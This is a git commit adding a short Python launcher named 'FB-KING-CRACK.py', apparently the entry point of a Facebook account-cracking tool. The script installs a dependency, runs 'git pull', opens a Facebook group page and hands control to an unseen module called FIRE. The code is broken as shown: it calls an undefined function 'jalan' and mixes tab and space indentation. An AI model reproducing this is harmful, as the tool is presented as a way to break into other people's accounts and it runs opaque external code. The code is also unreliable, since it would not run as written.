77d30886856437d7b07aaf914884648047d00996
heyman1212 <107253355+heyman1212@users.noreply.github.com>
2022-07-05 03:51:06 +0600

    Add files via upload

---
+++ FB-KING-CRACK.py
@@ -0,0 +1,16 @@
+import os, platform, time
+try:
+    import requests
+except:
+    os.system('pip install requests')
+    os.system('git pull')
+    import requests
+bit = platform.architecture()[0]
+if bit == '64bit':
+	jalan("🌺 Assalamu alaikum 🌺")
+	time.sleep(2)
+    jalan("\n\x1b[1;92m Congratulations ! Your Device Support this Tools 🙋")
+    print(' Join our Facebook group ❤ ')
+    os.system('xdg-open https://www.facebook.com/groups/blackmafiax.pamming.squad/?ref=share');time.sleep(3)
+    from FIRE import Subscraption
+    Subscraption()
